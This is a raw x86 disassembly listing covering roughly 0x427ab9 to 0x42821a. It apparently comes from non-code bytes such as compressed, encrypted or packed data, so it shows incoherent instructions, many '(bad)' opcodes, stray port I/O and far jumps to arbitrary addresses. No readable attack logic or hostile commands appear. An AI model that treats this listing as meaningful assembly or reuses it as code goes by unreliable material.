  427ab9:	push   0xffffffd1
  427abb:	scas   al,BYTE PTR es:[edi]
  427abc:	push   esi
  427abd:	cs fs ret 0x9535
  427ac2:	fadd   QWORD PTR [edx]
  427ac4:	aad    0xad
  427ac6:	cmp    BYTE PTR ds:0xeea2ea8a,bh
  427acc:	jno    0x427a9e
  427ace:	mov    WORD PTR [edi+0xd1b110d],?
  427ad4:	push   eax
  427ad5:	cmp    al,0x50
  427ad7:	and    eax,0x33b47afc
  427adc:	cmp    edx,DWORD PTR [ebx+0x8e7c130]
  427ae2:	cmp    edx,DWORD PTR [ebx-0x6]
  427ae5:	call   0xa1cc:0x341b4d74
  427aec:	xor    al,ch
  427aee:	sub    eax,0x9b01ccec
  427af3:	imul   ecx,DWORD PTR [edi+0x7d],0xffffffdb
  427af7:	in     al,0xbb
  427af9:	push   eax
  427afa:	push   edi
  427afb:	push   cs
  427afc:	loope  0x427ad2
  427afe:	inc    ebx
  427aff:	hlt    
  427b00:	icebp  
  427b01:	cli    
  427b02:	xchg   ebx,eax
  427b03:	and    al,0xac
  427b05:	leave  
  427b06:	pop    ecx
  427b07:	scas   al,BYTE PTR es:[edi]
  427b08:	adc    eax,0x7f8b412e
  427b0d:	xor    eax,0x4cbbd285
  427b12:	outs   dx,DWORD PTR ds:[esi]
  427b13:	jno    0x427ac1
  427b15:	jmp    0x427b2a
  427b17:	repz hlt 
  427b19:	pop    edx
  427b1a:	mov    ebp,0x3ef376f9
  427b1f:	stos   DWORD PTR es:[edi],eax
  427b20:	fwait
  427b21:	ror    BYTE PTR [ebp-0x394d6e1e],cl
  427b27:	aam    0x7a
  427b29:	imul   ecx,DWORD PTR [esi-0x4c],0xffffffa6
  427b2d:	xchg   esi,eax
  427b2e:	adc    DWORD PTR [eax-0x32],esp
  427b31:	push   0x2a
  427b33:	push   ebp
  427b34:	jg     0x427b4b
  427b36:	stos   DWORD PTR es:[edi],eax
  427b37:	xchg   ecx,eax
  427b38:	es data16 jnp 0x427ac9
  427b3c:	sbb    ch,bh
  427b3e:	push   ebx
  427b3f:	jmp    0x427b5d
  427b41:	mov    ch,0x4d
  427b43:	sbb    ebx,edi
  427b45:	pop    ds
  427b46:	dec    ebp
  427b47:	inc    edi
  427b48:	popa   
  427b49:	fdivr  st,st(4)
  427b4b:	push   ebp
  427b4c:	mov    ch,0x8f
  427b4e:	pop    esp
  427b4f:	es or  eax,0x4216d5b6
  427b55:	lock jmp 0x427b9c
  427b58:	fld    DWORD PTR [ecx+0x44]
  427b5b:	jnp    0x427b70
  427b5d:	jbe    0x427b4c
  427b5f:	xor    DWORD PTR [ecx+0x6fa3e63e],ebx
  427b65:	out    0x78,eax
  427b67:	pop    esp
  427b68:	or     BYTE PTR ds:0x5111506f,ah
  427b6e:	adc    bh,BYTE PTR [ebp+0x69d309d2]
  427b74:	test   BYTE PTR [ecx+ebp*4+0x72],ch
  427b78:	push   eax
  427b79:	fxch   st(3)
  427b7b:	xor    BYTE PTR [edx],cl
  427b7d:	add    BYTE PTR [ecx-0x4f],bl
  427b80:	ds pop edx
  427b82:	jg     0x427ba5
  427b84:	repnz mov bh,0x39
  427b87:	jne    0x427b58
  427b89:	or     DWORD PTR [ebx],esi
  427b8b:	mov    ah,0x77
  427b8d:	daa    
  427b8e:	stos   BYTE PTR es:[edi],al
  427b8f:	retf   0xecdb
  427b92:	and    ebx,DWORD PTR [ebp+ebp*8-0x59]
  427b96:	or     DWORD PTR [esi],0xffffffdf
  427b99:	mov    DWORD PTR [ecx],ebx
  427b9b:	pop    edx
  427b9c:	aaa    
  427b9d:	mov    bl,0xb4
  427b9f:	(bad)  
  427ba0:	fisub  WORD PTR [eax+0x1a2c7282]
  427ba6:	pop    esp
  427ba7:	xchg   esp,eax
  427ba8:	lods   al,BYTE PTR ds:[esi]
  427ba9:	adc    ebx,DWORD PTR [edi+edx*4+0x37a5d51]
  427bb0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bb1:	jmp    0x427c2b
  427bb3:	ror    ebx,1
  427bb5:	jo     0x427baf
  427bb7:	pop    ebx
  427bb8:	enter  0x1f46,0x9
  427bbc:	mov    al,0x8d
  427bbe:	cmp    BYTE PTR [ebx-0x26],0x38
  427bc2:	pop    ecx
  427bc3:	push   ds
  427bc4:	xchg   cl,ch
  427bc6:	jmp    0x427bda
  427bc8:	das    
  427bc9:	dec    esi
  427bca:	pop    ebx
  427bcb:	xlat   BYTE PTR cs:[bx]
  427bce:	outs   dx,BYTE PTR ds:[esi]
  427bcf:	shl    DWORD PTR [bp+di],0xcf
  427bd3:	(bad)  
  427bd4:	mov    cl,0x6d
  427bd6:	pop    ebx
  427bd7:	aaa    
  427bd8:	cmc    
  427bd9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427bda:	sub    eax,0xe2daaa87
  427bdf:	cmp    bl,bh
  427be1:	ins    BYTE PTR es:[edi],dx
  427be2:	sub    BYTE PTR [edx+0x6d],0x4f
  427be6:	xchg   edi,eax
  427be7:	je     0x427be2
  427be9:	sbb    eax,0x8eb117ab
  427bee:	sbb    al,0x7a
  427bf0:	popf   
  427bf1:	push   ebx
  427bf2:	jo     0x427c0a
  427bf4:	mov    bh,0xc4
  427bf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427bf7:	adc    al,0xb6
  427bf9:	mov    ecx,0x19659a86
  427bfe:	loop   0x427bd2
  427c00:	pop    es
  427c01:	mov    WORD PTR [ebx-0x46],fs
  427c04:	sub    eax,esi
  427c06:	std    
  427c07:	xor    eax,0x9a8923e1
  427c0c:	imul   ebp,edi,0x7c458b0d
  427c12:	add    DWORD PTR [esi],esi
  427c14:	(bad)  
  427c15:	sub    DWORD PTR [eax+0x7717ecfb],ebp
  427c1b:	jo     0x427c60
  427c1d:	jbe    0x427c40
  427c1f:	pop    ebp
  427c20:	and    eax,0x3b8dac80
  427c25:	mov    ch,0xc5
  427c27:	jp     0x427be3
  427c29:	jnp    0x427bdf
  427c2b:	repnz xchg edx,eax
  427c2d:	(bad)  
  427c2f:	setae  BYTE PTR [ebx+0x12430351]
  427c36:	mov    edi,DWORD PTR [ecx-0x4af6d968]
  427c3c:	or     BYTE PTR [ebx],dl
  427c3e:	xchg   ebp,eax
  427c3f:	scas   al,BYTE PTR es:[edi]
  427c40:	jle    0x427bc6
  427c42:	sbb    BYTE PTR [esi+0x28],0xcb
  427c46:	mov    WORD PTR [esp+eax*8+0x7a3fe8f0],?
  427c4d:	push   esi
  427c4e:	xor    ch,0x92
  427c51:	(bad)  
  427c52:	cld    
  427c53:	xor    DWORD PTR [esi],esp
  427c55:	mov    cl,0x7d
  427c57:	sbb    esp,DWORD PTR ds:0xcba6c676
  427c5d:	fimul  WORD PTR [eax+eax*2-0x36f4177d]
  427c64:	pusha  
  427c65:	mov    WORD PTR [ebp+edi*4-0x3b],?
  427c69:	std    
  427c6a:	(bad)  
  427c6b:	in     al,dx
  427c6c:	es leave 
  427c6e:	ins    BYTE PTR es:[edi],dx
  427c6f:	xor    al,0xae
  427c71:	loopne 0x427ca0
  427c73:	fwait
  427c74:	mov    esi,DWORD PTR [edi]
  427c76:	mov    edi,0xef8ee21c
  427c7b:	add    dh,al
  427c7d:	sbb    dl,BYTE PTR [ebx-0xbed7866]
  427c83:	pop    edi
  427c84:	daa    
  427c85:	jnp    0x427c85
  427c87:	xlat   BYTE PTR ds:[ebx]
  427c88:	in     eax,0x30
  427c8a:	out    dx,al
  427c8b:	mul    BYTE PTR ds:0xd38c31d9
  427c91:	ror    BYTE PTR [ecx-0x2a4fae85],1
  427c97:	ins    DWORD PTR es:[edi],dx
  427c98:	push   ds
  427c99:	loopne 0x427cf2
  427c9b:	pusha  
  427c9c:	pop    ebx
  427c9d:	mov    al,0x76
  427c9f:	sti    
  427ca0:	push   esp
  427ca1:	js     0x427c97
  427ca3:	fwait
  427ca4:	push   es
  427ca5:	inc    ecx
  427ca6:	push   0xdde48172
  427cab:	outs   dx,BYTE PTR ds:[esi]
  427cac:	pop    ebp
  427cad:	dec    edi
  427cae:	imul   ebp,ebp,0xffffff8a
  427cb1:	sub    BYTE PTR [esp+edi*1+0x6b],al
  427cb5:	xor    al,0xfe
  427cb7:	sub    eax,0x3071
  427cbc:	nop
  427cbd:	stos   DWORD PTR es:[edi],eax
  427cbe:	es ret 
  427cc0:	aas    
  427cc1:	iret   
  427cc2:	cmc    
  427cc3:	sti    
  427cc4:	pushf  
  427cc5:	ds loop 0x427cb4
  427cc8:	push   edi
  427cc9:	push   ss
  427cca:	and    eax,0x1f454cc
  427ccf:	add    BYTE PTR [esi-0x12fffffe],al
  427cd5:	inc    ebx
  427cd6:	xchg   BYTE PTR [ecx-0x17],bh
  427cd9:	clc    
  427cda:	add    bl,dl
  427cdc:	(bad)  
  427cdd:	lock jp 0x427cf6
  427ce0:	retf   
  427ce1:	add    edi,ebx
  427ce3:	or     eax,DWORD PTR [ebx+ecx*1]
  427ce6:	adc    eax,0xda8b0e0f
  427ceb:	scas   eax,DWORD PTR es:[edi]
  427cec:	push   edx
  427ced:	aad    0x54
  427cef:	rcl    BYTE PTR ds:0xb08887e2,cl
  427cf5:	ja     0x427d6b
  427cf7:	mov    ds:0x478a8cc6,al
  427cfc:	(bad)  
  427cfd:	jg     0x427d22
  427cff:	push   edi
  427d00:	mov    eax,edx
  427d02:	mov    eax,0x6d4eb96
  427d07:	push   ss
  427d08:	push   0xfcc049cb
  427d0d:	out    dx,eax
  427d0e:	jbe    0x427d88
  427d10:	cs push ds
  427d12:	mov    ah,BYTE PTR [edi+0x635516fc]
  427d18:	and    eax,0xe1cbb7f3
  427d1d:	sub    DWORD PTR [edi+0x5ac033cb],esi
  427d23:	aas    
  427d24:	test   DWORD PTR [esi],0xec424f2f
  427d2a:	call   0xe34f:0x3cf3dac6
  427d31:	or     al,ch
  427d33:	int    0x70
  427d35:	cli    
  427d36:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d37:	dec    eax
  427d38:	push   esi
  427d39:	loopne 0x427db8
  427d3b:	push   0xffffffd6
  427d3d:	out    dx,al
  427d3e:	pop    ss
  427d3f:	and    DWORD PTR [esi],ebx
  427d41:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427d42:	ss jno 0x427d18
  427d45:	jp     0x427d23
  427d47:	mov    ebp,0xabb3970b
  427d4c:	arpl   WORD PTR [eax+0x3a355b5a],si
  427d52:	test   BYTE PTR [esi+0x6fd50859],bl
  427d58:	into   
  427d59:	retf   
  427d5a:	cld    
  427d5b:	xchg   esp,eax
  427d5c:	pop    esp
  427d5d:	clc    
  427d5e:	xchg   edi,eax
  427d5f:	jbe    0x427d9d
  427d61:	sub    eax,0xbc93b83f
  427d66:	mov    edi,0xaa6392f3
  427d6b:	push   edx
  427d6c:	sub    BYTE PTR [eax+0x3b08ff5d],bh
  427d72:	xor    al,0xe5
  427d74:	push   ebp
  427d75:	aad    0xc0
  427d77:	mul    al
  427d79:	push   0xffffff95
  427d7b:	and    bh,dl
  427d7d:	inc    ebp
  427d7e:	cmp    DWORD PTR [edx],edx
  427d80:	mov    ch,0x33
  427d82:	lahf   
  427d83:	shr    dh,1
  427d85:	add    eax,0x281fbd65
  427d8a:	xor    ah,BYTE PTR [ecx+edi*4+0x7387f249]
  427d91:	ror    DWORD PTR [ecx-0x28],1
  427d94:	adc    al,0x9f
  427d96:	retf   0xcfb4
  427d99:	xchg   edi,eax
  427d9a:	dec    ebp
  427d9b:	push   ds
  427d9c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427d9d:	jmp    DWORD PTR [esi-0x6f]
  427da0:	and    bh,BYTE PTR [eax-0x8d0ae51]
  427da6:	lods   eax,DWORD PTR ds:[esi]
  427da7:	neg    DWORD PTR [edi+0x5e]
  427daa:	mov    DWORD PTR [eax+ebp*4+0x61cbbb2],ebx
  427db1:	push   ds
  427db2:	pop    ebp
  427db3:	push   es
  427db4:	push   ecx
  427db5:	jmp    0x9c9da72
  427dba:	jno    0x427e0b
  427dbc:	cmp    cl,0x82
  427dbf:	jmp    0x881a:0xdbfd063e
  427dc6:	push   ebp
  427dc7:	inc    ebp
  427dc8:	jmp    0x3249:0x78131db0
  427dcf:	jg     0x427de9
  427dd1:	inc    edx
  427dd2:	push   es
  427dd3:	mov    esi,0xe7f408e0
  427dd8:	aam    0x6e
  427dda:	retf   
  427ddb:	xchg   esp,eax
  427ddc:	mov    ebp,DWORD PTR [edx]
  427dde:	jmp    0x427d6e
  427de0:	cmp    al,0x3d
  427de2:	fcmove st,st(6)
  427de4:	sbb    ecx,DWORD PTR cs:[edx+0x5e]
  427de8:	inc    ebp
  427de9:	add    ecx,ebp
  427deb:	cmp    eax,0x3afb0b39
  427df0:	xchg   ebp,eax
  427df1:	pop    ebp
  427df2:	jmp    0xa9743462
  427df7:	mov    ds:0xa449a3c1,al
  427dfc:	sahf   
  427dfd:	rcr    al,cl
  427dff:	out    0x18,al
  427e01:	dec    ecx
  427e02:	push   ss
  427e03:	jl     0x427dd8
  427e05:	mov    eax,0xe12ed39a
  427e0a:	cli    
  427e0b:	cmovle edi,eax
  427e0e:	jnp    0x427dd1
  427e10:	repz mov ds:0xa94c383c,al
  427e16:	xchg   esp,eax
  427e17:	mov    bh,0x17
  427e19:	mov    ah,BYTE PTR ds:0xd314e588
  427e1f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e20:	or     BYTE PTR [ecx],ah
  427e22:	shl    eax,0xcb
  427e25:	pop    ebp
  427e26:	ins    BYTE PTR es:[edi],dx
  427e27:	popa   
  427e28:	jmp    0x8ae3e330
  427e2d:	sbb    BYTE PTR [eax],bl
  427e2f:	push   eax
  427e30:	out    0x3c,eax
  427e32:	call   0x9c3f7de
  427e37:	adc    DWORD PTR [esi-0x5386b44a],edi
  427e3d:	hlt    
  427e3e:	mul    BYTE PTR [esi]
  427e40:	mov    ah,0x27
  427e42:	(bad)  
  427e43:	in     eax,dx
  427e44:	xor    al,0x27
  427e46:	xor    esi,edx
  427e48:	outs   dx,BYTE PTR ds:[esi]
  427e49:	cmp    dh,bl
  427e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427e4c:	je     0x427dfd
  427e4e:	(bad)  
  427e4f:	mov    ah,0xaa
  427e51:	mov    bl,0x8c
  427e53:	pop    ds
  427e54:	scas   al,BYTE PTR es:[edi]
  427e55:	out    0x32,al
  427e57:	xchg   edi,eax
  427e58:	inc    ecx
  427e59:	jns    0x427eb5
  427e5b:	imul   esp,DWORD PTR [esi-0x60762a63],0xd0ea2c05
  427e65:	pop    esi
  427e66:	adc    BYTE PTR [ebx-0x3fd73143],bh
  427e6c:	jg     0x427e5c
  427e6e:	call   0xe3f17bf8
  427e73:	dec    ebx
  427e74:	les    esi,FWORD PTR [edi]
  427e76:	add    al,0x7e
  427e78:	push   esi
  427e79:	cs dec esp
  427e7b:	call   0x8e53:0x2af194e7
  427e82:	and    dh,BYTE PTR [edi]
  427e84:	leave  
  427e85:	(bad)  
  427e86:	xchg   edi,eax
  427e87:	or     al,0x9
  427e89:	rcl    BYTE PTR [ebp-0x3bdbc062],cl
  427e8f:	adc    eax,0xc465b40f
  427e94:	sub    bh,BYTE PTR [ebx-0x6a2019d1]
  427e9a:	jne    0x427e50
  427e9c:	add    DWORD PTR [esi+0x7acf7840],esi
  427ea2:	xchg   ebx,eax
  427ea3:	push   edi
  427ea4:	fwait
  427ea5:	stos   DWORD PTR es:[edi],eax
  427ea6:	pop    ebp
  427ea7:	cli    
  427ea8:	mov    DWORD PTR [edi+ebx*2],edi
  427eab:	call   0x9aa3:0x188d35b0
  427eb2:	jge    0x427e60
  427eb4:	call   0xf63a:0xd365eb54
  427ebb:	imul   ebx,ebx,0xc
  427ebe:	xchg   ecx,eax
  427ebf:	(bad)  
  427ec0:	cs or  eax,0xc4b9e68
  427ec6:	test   al,0xe4
  427ec8:	sar    DWORD PTR [eax-0x14],1
  427ecb:	cwde   
  427ecc:	inc    BYTE PTR [ebx]
  427ece:	jns    0x427eea
  427ed0:	lock ins BYTE PTR es:[edi],dx
  427ed2:	push   ebp
  427ed3:	ja     0x427f14
  427ed5:	outs   dx,BYTE PTR ds:[esi]
  427ed6:	lahf   
  427ed7:	ret    
  427ed8:	mov    ecx,0x5d6a70b1
  427edd:	inc    eax
  427ede:	ss retf 0x667f
  427ee2:	arpl   WORD PTR [ecx-0x45a057e3],dx
  427ee8:	mov    ds:0xcf9ef2dd,eax
  427eed:	fdiv   QWORD PTR [edx+0xc]
  427ef0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427ef1:	daa    
  427ef2:	mul    DWORD PTR [eax]
  427ef4:	mov    ch,0x70
  427ef6:	push   edi
  427ef7:	fsub   DWORD PTR [ebx+0x5d]
  427efa:	(bad)  
  427efb:	test   edi,edx
  427efd:	(bad)  
  427efe:	(bad)  
  427eff:	enter  0xf085,0xa6
  427f03:	mov    ebx,0x2e400926
  427f08:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  427f09:	adc    al,0xad
  427f0b:	pop    ebx
  427f0c:	mov    al,0x68
  427f0e:	push   esi
  427f0f:	jne    0x427ead
  427f11:	es mov cl,0x44
  427f14:	pop    eax
  427f15:	jb     0x427f92
  427f17:	sub    BYTE PTR [ecx+0x24],bl
  427f1a:	and    edx,DWORD PTR [edi-0x16091886]
  427f20:	icebp  
  427f21:	mov    ds:0x1ba9d997,al
  427f26:	jbe    0x427ee1
  427f28:	xchg   BYTE PTR [ebx-0x3eff148e],bh
  427f2e:	sbb    ebp,DWORD PTR [ebx+ebx*4+0x6d0cb6c6]
  427f35:	iret   
  427f36:	pushf  
  427f37:	dec    edi
  427f38:	mov    al,ds:0xbfde7309
  427f3d:	adc    bh,BYTE PTR [edi]
  427f3f:	outs   dx,DWORD PTR ds:[esi]
  427f40:	loope  0x427f78
  427f42:	pop    ecx
  427f43:	push   ss
  427f44:	pop    ebp
  427f45:	ins    BYTE PTR es:[edi],dx
  427f46:	cmp    al,0x3a
  427f48:	inc    ecx
  427f49:	and    al,0x48
  427f4b:	cwde   
  427f4c:	in     al,dx
  427f4d:	mov    al,ds:0x51445f80
  427f52:	das    
  427f53:	scas   al,BYTE PTR es:[edi]
  427f54:	pop    es
  427f55:	leave  
  427f56:	sub    eax,0x621af8
  427f5b:	add    ch,bh
  427f5d:	cmp    DWORD PTR ds:0xfd1cf514,esi
  427f63:	stc    
  427f64:	int    0xea
  427f66:	xor    al,al
  427f68:	cmp    al,0x12
  427f6a:	ja     0x427fd6
  427f6c:	(bad)  
  427f6e:	add    DWORD PTR [eax],eax
  427f70:	xchg   BYTE PTR [edx],al
  427f72:	add    BYTE PTR [eax],al
  427f74:	scas   eax,DWORD PTR es:[edi]
  427f75:	push   ds
  427f76:	xlat   BYTE PTR ds:[ebx]
  427f77:	cmc    
  427f78:	idiv   DWORD PTR [ecx+0x427d1f6]
  427f7e:	aam    0xf4
  427f80:	ja     0x427f21
  427f82:	fild   QWORD PTR [edx-0x3]
  427f86:	xchg   edi,eax
  427f87:	xor    eax,0xa6d155bc
  427f8c:	ins    BYTE PTR es:[edi],dx
  427f8d:	mov    cs:0x5eff17d5,al
  427f93:	stos   DWORD PTR es:[edi],eax
  427f94:	retf   
  427f95:	ror    dl,cl
  427f97:	loopne 0x427fc2
  427f99:	iret   
  427f9a:	dec    edi
  427f9b:	xchg   DWORD PTR [ebp+0x1d],ebx
  427f9e:	fs mov bh,0xe5
  427fa1:	ret    
  427fa2:	jmp    0xd290e755
  427fa7:	(bad)  
  427fa8:	xor    eax,0x8b1fc9f4
  427fad:	cmp    dh,BYTE PTR [eax]
  427faf:	or     eax,0x38b9d382
  427fb4:	pop    es
  427fb5:	mov    DWORD PTR [ecx],esi
  427fb7:	jmp    0x27301a1f
  427fbc:	add    edi,DWORD PTR [edx]
  427fbe:	mov    ch,0x63
  427fc0:	cmp    bh,BYTE PTR [eax-0x365b4ec7]
  427fc6:	sbb    ebx,DWORD PTR [esp+eax*1+0x33376ad9]
  427fcd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427fce:	or     al,0x67
  427fd0:	push   dx
  427fd2:	aaa    
  427fd3:	mov    ds:0x2469ceb4,al
  427fd8:	clc    
  427fd9:	gs pop esi
  427fdb:	adc    eax,0x221c7a5f
  427fe0:	add    ch,BYTE PTR [edi+0xd46f7b2]
  427fe6:	and    ch,BYTE PTR [ebx-0x7077ec4f]
  427fec:	cmc    
  427fed:	cmp    esi,DWORD PTR [edi]
  427fef:	add    BYTE PTR [edi-0x24ed5d94],dl
  427ff5:	fadd   QWORD PTR [ecx-0x31]
  427ff8:	neg    esi
  427ffa:	stos   DWORD PTR es:[edi],eax
  427ffb:	ret    0x20de
  427ffe:	daa    
  427fff:	inc    eax
  428000:	hlt    
  428001:	repnz dec edi
  428003:	retf   
  428004:	loop   0x428005
  428006:	mov    ebp,0x3dd3c8ad
  42800b:	pop    ecx
  42800c:	js     0x428086
  42800e:	mov    bh,0xd5
  428010:	mov    ?,ecx
  428012:	push   esp
  428013:	cwde   
  428014:	ret    
  428015:	jle    0x428027
  428017:	and    eax,0xf27e6eac
  42801c:	lock dec esi
  42801e:	cmp    BYTE PTR [esi+edi*8+0x54],0xa6
  428023:	xchg   esp,eax
  428024:	cmp    DWORD PTR [edx],esi
  428026:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  428027:	lock test DWORD PTR [edi],0xa99603ca
  42802e:	pop    esi
  42802f:	mov    edi,0x98d2515b
  428034:	push   ebp
  428035:	inc    ebx
  428036:	xlat   BYTE PTR ds:[ebx]
  428037:	retf   0xee96
  42803a:	(bad)  
  42803b:	retf   0x6633
  42803e:	pop    esp
  42803f:	mov    bh,0x97
  428041:	cmp    esi,DWORD PTR [ebp-0x7d9fd0bf]
  428047:	sub    edx,DWORD PTR [esi-0x73]
  42804a:	(bad)
  42804d:	(bad)  
  42804e:	xlat   BYTE PTR ds:[ebx]
  42804f:	sub    ah,dh
  428051:	jmp    0xc8c1d796
  428056:	mov    ch,0x52
  428058:	jecxz  0x4280be
  42805a:	das    
  42805b:	retf   
  42805c:	and    eax,0x3f6fc19a
  428061:	lods   eax,DWORD PTR ds:[esi]
  428062:	adc    DWORD PTR [ecx-0x8babfd4],esi
  428068:	xchg   ebx,eax
  428069:	inc    edi
  42806a:	pop    edx
  42806b:	push   esi
  42806c:	jno    0x428014
  42806e:	jmp    0x4280d0
  428070:	pop    es
  428071:	cld    
  428072:	out    dx,al
  428073:	pushf  
  428074:	and    eax,0x30653452
  428079:	vcvtsi2sd xmm7,xmm6,DWORD PTR [ebx-0x1c4a9bfc]
  428081:	repnz dec esp
  428083:	add    eax,0x4fe73fdf
  428088:	inc    edx
  428089:	pop    ds
  42808a:	xor    bh,al
  42808c:	dec    esi
  42808d:	(bad)  
  42808e:	lahf   
  42808f:	ret    
  428090:	jnp    0x4280b5
  428092:	cwde   
  428093:	adc    DWORD PTR [eax-0x77],esp
  428096:	push   ebp
  428097:	push   esp
  428098:	test   BYTE PTR [ecx+0x3],al
  42809b:	add    eax,0xac3373db
  4280a0:	lods   al,BYTE PTR ds:[esi]
  4280a1:	xor    DWORD PTR [ebx+0x59],esp
  4280a4:	lock pop esp
  4280a6:	push   esi
  4280a7:	lahf   
  4280a8:	sbb    cl,BYTE PTR [ebp+0x48]
  4280ab:	xchg   ebx,eax
  4280ac:	les    ecx,FWORD PTR [esi-0x1d7fd010]
  4280b2:	ficom  DWORD PTR [edi-0x16]
  4280b5:	cld    
  4280b6:	dec    ebx
  4280b7:	inc    ebp
  4280b8:	fcomp  DWORD PTR [edi+0x11]
  4280bb:	mov    bl,0x84
  4280bd:	lock and DWORD PTR [ebx-0x9c2585d],0xd9592f3c
  4280c8:	push   ds
  4280c9:	push   0x44444897
  4280ce:	adc    ebp,DWORD PTR [esi-0x75]
  4280d1:	xlat   BYTE PTR ds:[ebx]
  4280d2:	nop
  4280d3:	or     BYTE PTR [esi],bl
  4280d5:	add    al,0x37
  4280d7:	sub    BYTE PTR [eax+0x50001e4e],al
  4280dd:	mov    ah,BYTE PTR [ecx]
  4280df:	xor    eax,0x3ca1fb72
  4280e4:	mov    WORD PTR [edi],ss
  4280e6:	sar    BYTE PTR [esp+esi*8-0x2d52de59],cl
  4280ed:	loope  0x428128
  4280ef:	mov    edx,0x82d39bd
  4280f4:	or     al,0x42
  4280f6:	sti    
  4280f7:	mov    eax,ds:0xa41102f1
  4280fc:	mov    esi,0xb042fa37
  428101:	lods   al,BYTE PTR ds:[esi]
  428102:	or     al,0x95
  428104:	jle    0x428155
  428106:	mov    eax,ds:0xba3c0f0a
  42810b:	fcomp  DWORD PTR [edx+ebx*1-0x41d1a7b9]
  428112:	fmul   QWORD PTR [esi+0x48c851ce]
  428118:	jae    0x4280ef
  42811a:	add    edx,edx
  42811c:	icebp  
  42811d:	jecxz  0x428185
  42811f:	mov    al,ds:0xab913709
  428124:	call   0x92266994
  428129:	pushw  es
  42812b:	push   ecx
  42812c:	dec    esi
  42812d:	and    eax,0xf7d5b1e7
  428132:	sub    DWORD PTR [eax+0x2112d091],esp
  428138:	test   BYTE PTR [edi-0x3b294fac],0x8b
  42813f:	mov    eax,?
  428141:	pop    ebx
  428142:	test   al,0x39
  428144:	cmp    BYTE PTR [eax-0x7a],ch
  428147:	jno    0x4281bf
  428149:	icebp  
  42814a:	push   esi
  42814b:	xchg   edx,eax
  42814c:	sub    ebx,DWORD PTR [esp+ecx*4+0x4699067d]
  428153:	pop    edx
  428154:	dec    esi
  428155:	dec    ecx
  428156:	mov    ds:0xd7214b4c,eax
  42815b:	or     al,0x97
  42815d:	or     eax,0xb8015a4e
  428162:	test   ebx,edi
  428164:	imul   ah
  428166:	mov    fs,WORD PTR cs:[eax+0x2]
  42816a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42816b:	mov    ds:0x6fdce9f4,al
  428170:	sar    eax,0x3a
  428173:	jb     0x428110
  428175:	adc    ebx,DWORD PTR [edi]
  428177:	in     eax,0x87
  428179:	in     al,0xc4
  42817b:	inc    edi
  42817c:	fwait
  42817d:	dec    ecx
  42817e:	push   cs
  42817f:	dec    edi
  428180:	mov    edi,esi
  428182:	jp     0x42814d
  428184:	push   edi
  428185:	jns    0x4281a1
  428187:	dec    edi
  428188:	inc    edi
  428189:	and    eax,0x4729fa5
  42818e:	out    dx,eax
  42818f:	fidiv  WORD PTR [edi-0x23fa9cac]
  428195:	test   eax,0x87350ad6
  42819a:	js     0x42820a
  42819c:	test   al,0xd8
  42819e:	pop    ebx
  42819f:	xor    al,0xfa
  4281a1:	mov    BYTE PTR [esp+ecx*2],ah
  4281a4:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  4281a6:	mov    esi,0x6899999a
  4281ab:	jmp    0x42812e
  4281ad:	cmp    bl,BYTE PTR [ecx+0x73]
  4281b0:	add    BYTE PTR [edx-0x499e4c8b],ch
  4281b6:	mov    ebx,0xa6276ce9
  4281bb:	cwde   
  4281bc:	cmp    eax,0x86d26e07
  4281c1:	push   esp
  4281c2:	arpl   bx,ax
  4281c4:	cmc    
  4281c5:	push   esi
  4281c6:	in     al,dx
  4281c7:	dec    ecx
  4281c8:	adc    dh,BYTE PTR [eax+edx*8]
  4281cb:	fisubr DWORD PTR [ebx+edi*2-0x10]
  4281cf:	xor    bl,bl
  4281d1:	sbb    al,0xe8
  4281d3:	inc    esp
  4281d4:	hlt    
  4281d5:	xor    eax,0x456a084c
  4281da:	iret   
  4281db:	mul    al
  4281dd:	shr    BYTE PTR [edi+0x70],0xec
  4281e1:	lock jbe 0x42825a
  4281e4:	adc    DWORD PTR [ebx+0x363e8ff],edx
  4281ea:	sub    DWORD PTR gs:[esi-0x48],edx
  4281ee:	sbb    dh,bh
  4281f0:	jl     0x4281a9
  4281f2:	xchg   edi,eax
  4281f3:	scas   eax,DWORD PTR es:[edi]
  4281f4:	mov    al,BYTE PTR [ecx+0x1a79e78d]
  4281fa:	add    BYTE PTR [eax],al
  4281fc:	test   eax,0xf82c6051
  428201:	cmp    eax,0x8ba9d5ed
  428206:	mov    ebx,0x8912d792
  42820b:	ins    BYTE PTR es:[edi],dx
  42820c:	pusha  
  42820d:	stc    
  42820e:	add    DWORD PTR [eax],eax
  428210:	pop    es
  428211:	add    BYTE PTR [eax],al
  428213:	add    BYTE PTR [eax],ah
  428215:	test   eax,0x1bc7922
  42821a:	pop    es
	...
